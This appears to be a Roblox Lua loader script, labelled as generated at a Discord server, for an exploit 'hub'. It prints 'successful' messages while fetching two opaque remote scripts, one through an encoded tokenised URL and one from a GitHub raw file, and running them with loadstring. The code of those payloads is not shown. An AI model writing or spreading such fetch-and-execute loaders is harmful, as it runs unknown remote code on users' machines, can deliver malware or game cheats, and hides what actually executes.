-- This file was generated at discord.gg/syncrypt

local function v1()
	print("Loader: successful!")
	task.wait(0.5)
	task.defer(function()
		loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjE3ZjA0Y2NjLWE2NTktNDE5OC1iMGZjLWM4ZGUwMGRjZTJkZCIsImtpbmQiOiJsb2FkZXIifQ"))()
	end)
end
task.spawn(function()
	print("UI Load: successful!")
	task.wait(0.1)
	loadstring(game:HttpGet("https://raw.githubusercontent.com/zyntrix20/New/refs/heads/main/OnyxHub%202.0"))()
end)
task.delay(0.3, function()
	task.spawn(v1)
end)
